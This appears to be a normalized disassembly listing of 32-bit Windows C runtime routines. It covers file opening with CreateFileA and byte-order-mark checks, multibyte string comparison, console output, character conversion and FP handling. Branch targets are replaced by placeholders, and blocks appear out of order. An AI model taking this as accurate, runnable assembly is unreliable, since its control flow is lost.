dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
sub eax ecx
je r-xdata
test cl 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0x8 ] 0x40000000
jmp r-xdata
test ecx 0x70000
jne r-xdata
mov [ ebp - 0x8 ] edx
jmp r-xdata
call sub_410d01
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_410cee
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_40edf4
add esp 0x14
jmp r-xdata
mov [ ebp - 0x14 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
cmp eax ecx
mov edi 0x100
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
mov eax esi
jmp r-xdata
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x18 ]
test cl cl
js r-xdata
mov [ ebp - 0x14 ] 0x5
jmp r-xdata
cmp eax edx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x80
test edi eax
je r-xdata
cmp eax edi
je r-xdata
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test eax 0x1000
je r-xdata
or [ ebp - 0xc ] 0x4000000
or [ ebp - 0x8 ] 0x10000
or [ ebp - 0x10 ] 0x4
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp [ ebp - 0x8 ] edi
sete al
mov [ ebp - 0x10 ] eax
jmp r-xdata
test al 0x20
je r-xdata
or [ ebp - 0xc ] edi
cmp eax 0x300
jne r-xdata
test al 0x10
je r-xdata
or [ ebp - 0xc ] 0x8000000
jmp r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
call sub_4177b4
mov [ esi ] eax
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0xc ] 0x10000000
mov eax [ ebp + 0x8 ]
mov edi [ CreateFileA@IAT ]
push ebx
push [ ebp - 0xc ]
mov [ eax ] 0x1
push [ ebp - 0x14 ]
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_410d01
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_410cee
mov [ eax ] 0x18
jmp r-xdata
push [ ebp - 0x1c ]
call [ GetFileType@IAT ]
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
call sub_410cee
mov eax [ eax ]
jmp r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_410d14
pop ecx
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
cmp esi ebx
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_410d14
test [ ebp + 0x10 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_410cee
mov [ eax ] 0xd
jmp r-xdata
and [ ebp - 0x8 ] 0x7fffffff
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x30 ]
push [ ebp - 0x14 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
push [ esi ]
call sub_41756f
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
pop ecx
shl eax 0x6
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
shl eax 0x6
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
mov [ eax ] cl
cmp [ ebp - 0x3 ] bl
jne r-xdata
mov edi 0x74000
mov ecx 0x4000
test [ ebp + 0x10 ] edi
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov edi [ ebp - 0x8 ]
mov eax 0xc0000000
mov ecx edi
and ecx eax
cmp ecx eax
jne r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax edi
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x20 ]
and eax edi
jne r-xdata
push 0x2
or edi 0xffffffff
push edi
push [ esi ]
call sub_41681b
add esp 0xc
mov [ ebp - 0x18 ] eax
cmp eax edi
jne r-xdata
mov eax ebx
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] bl
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] ecx
jmp r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push [ esi ]
mov [ ebp - 0x4 ] bl
call sub_4151f6
add esp 0xc
test eax eax
jne r-xdata
call sub_410d01
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x30 ]
push 0x3
push eax
push [ ebp - 0x10 ]
and edi 0x7fffffff
push edi
push [ ebp + 0xc ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x18 ] ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push ebx
push ebx
push [ esi ]
call sub_41681b
add esp 0xc
cmp eax edi
je r-xdata
cmp [ ebp - 0x4 ] 0x1a
jne r-xdata
push [ esi ]
call sub_417329
jmp r-xdata
mov esi [ esi ]
mov ecx esi
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
mov [ esi + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_410d14
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
push [ esi ]
call sub_4175f0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
push [ esi ]
call sub_41e4bc
add esp 0xc
cmp eax edi
je r-xdata
pop ecx
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x18 ]
push eax
push [ esi ]
call sub_4151f6
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x18 ] 0xbfbbef
mov [ ebp - 0x14 ] 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_419d3c
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x18 ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp [ ebp - 0x14 ] edi
jg r-xdata
mov [ ebp - 0x18 ] 0xfeff
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_419d3c
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_417329
pop ecx
call sub_410cee
push 0x16
pop esi
mov [ eax ] esi
push ebx
push ebx
push [ esi ]
call sub_41681b
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x18 ] 0xbfbbef
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax [ ebp - 0x14 ]
sub eax edi
push eax
lea eax [ ebp + edi - 0x18 ]
push eax
push [ esi ]
call sub_416358
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
push ebx
push 0x2
push [ esi ]
call sub_41681b
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_419d3c
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_419d3c
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
sub_41baac
push 0x14
push r--data
call sub_4143e0
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov edi [ ebp + 0x18 ]
cmp edi esi
setne al
cmp eax esi
jne r-xdata
or [ edi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
je r-xdata
call sub_410cee
push 0x16
pop edi
mov [ eax ] edi
push esi
push esi
push esi
push esi
push esi
call sub_40edf4
add esp 0x14
mov eax edi
jmp r-xdata
cmp [ ebp + 0x1c ] esi
je r-xdata
call sub_414425
retn
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_41b38d
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41bb4a
mov eax [ ebp - 0x20 ]
cmp eax esi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ edi ] 0xffffffff
sub_41bb4a
cmp [ ebp - 0x1c ] esi
je r-xdata
retn
cmp [ ebp - 0x20 ] esi
je r-xdata
push [ edi ]
call sub_41778d
pop ecx
mov eax [ edi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_41bb78
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_41baac
add esp 0x18
pop ebp
retn
sub_41bb98
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x18 ]
call sub_40e5f8
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40e771
add esp 0xc
cmp [ ebp - 0xc ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_410cee
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
push esi
call sub_410cee
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx [ ebp - 0x8 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ecx dx
movzx cx [ ecx + 0x11d ]
movzx ecx cx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov dl [ edx ]
cmp dl bl
jne r-xdata
movzx ecx [ edi ]
test [ ecx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
movzx edx [ ebp - 0x4 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov [ ebp - 0x8 ] ecx
shl ecx 0x8
movzx dx dl
or cx dx
inc [ ebp + 0x8 ]
movzx ecx cx
mov si cx
mov [ ebp - 0x8 ] ecx
cmp si [ eax + 0x10 ]
jb r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
movzx ecx cx
mov si bx
jmp r-xdata
movzx ecx dx
movzx cx [ ecx + 0x11d ]
movzx ecx cx
jmp r-xdata
mov dl [ edi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp si [ eax + 0x16 ]
jb r-xdata
cmp si [ eax + 0x12 ]
ja r-xdata
mov si [ ebp - 0x8 ]
xor eax eax
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0x4 ] ecx
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0xc ] bl
je r-xdata
cmp si bx
je r-xdata
shl ecx 0x8
movzx dx dl
or cx dx
movzx ecx cx
inc edi
mov [ ebp - 0x4 ] ecx
cmp cx [ eax + 0x10 ]
jb r-xdata
mov cx [ ebp - 0x4 ]
movzx cx [ edi ]
movzx ecx cx
movzx edx cl
inc edi
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x4 ] ecx
je r-xdata
cmp si [ eax + 0x18 ]
ja r-xdata
add si [ eax + 0x14 ]
jmp r-xdata
pop esi
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
cmp cx [ eax + 0x16 ]
jb r-xdata
cmp cx [ eax + 0x12 ]
ja r-xdata
add si [ eax + 0x1a ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
movzx cx [ ecx ]
dec [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
movzx ecx cx
movzx edx cl
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ecx
je r-xdata
cmp cx si
jne r-xdata
cmp cx [ eax + 0x18 ]
ja r-xdata
add cx [ eax + 0x14 ]
jmp r-xdata
add cx [ eax + 0x1a ]
jmp r-xdata
sub_41bddd
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_40e5f8
mov edi [ ebp - 0xc ]
cmp [ edi + 0x8 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41acc6
add esp 0xc
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
push esi
mov esi [ ebp + 0xc ]
cmp esi ebx
jne r-xdata
call sub_410cee
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx ax [ eax ]
dec [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
movzx ecx ax
movzx eax cl
test [ eax + edi + 0x1d ] 0x4
je r-xdata
call sub_410cee
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ax [ esi ]
movzx eax ax
movzx edx al
inc esi
test [ edx + edi + 0x1d ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp ax cx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax ]
cmp al bl
jne r-xdata
movzx eax [ esi ]
xor ecx ecx
test [ eax + edi + 0x1d ] 0x4
je r-xdata
pop esi
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp cx bx
je r-xdata
mov dl [ esi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
xor eax eax
jmp r-xdata
shl ecx 0x8
movzx ax al
or cx ax
inc [ ebp + 0x8 ]
movzx ecx cx
xor ecx ecx
jmp r-xdata
movzx eax ax
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
movzx dx dl
shl eax 0x8
or ax dx
inc esi
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_41bf64
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41bf84
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_40e1e0
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_41bfc9
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_41bfc9
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_41bf84
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_41c079
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_41c098
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_41c070
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_41c079
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_41c09b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor esi esi
cmp [ rw-data ] esi
je r-xdata
push esi
push esi
push 0x5
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push esi
call [ GetConsoleOutputCP@IAT ]
push eax
call [ WideCharToMultiByte@IAT ]
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax 0xffff
jmp r-xdata
push esi
lea edx [ ebp - 0x10 ]
push edx
push eax
lea eax [ ebp - 0xc ]
push eax
push ecx
call [ WriteConsoleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_41e767
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40e1e0
leave
retn
mov ax [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
sub_41c160
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_40e5f8
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_41a147
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_410cee
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_41c2a0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_41c2cb
push 0x10
push r--data
call sub_4143e0
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor ebx ebx
cmp eax ebx
jl r-xdata
call sub_410cee
mov [ eax ] 0x9
call sub_410cee
mov [ eax ] 0x9
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40edf4
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_414425
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ esi + ecx + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_4176ed
pop ecx
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_410cee
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_417676
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] ebx
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41c3a2
mov eax [ ebp - 0x1c ]
call sub_410d01
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] ebx
je r-xdata
sub_41c3ac
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
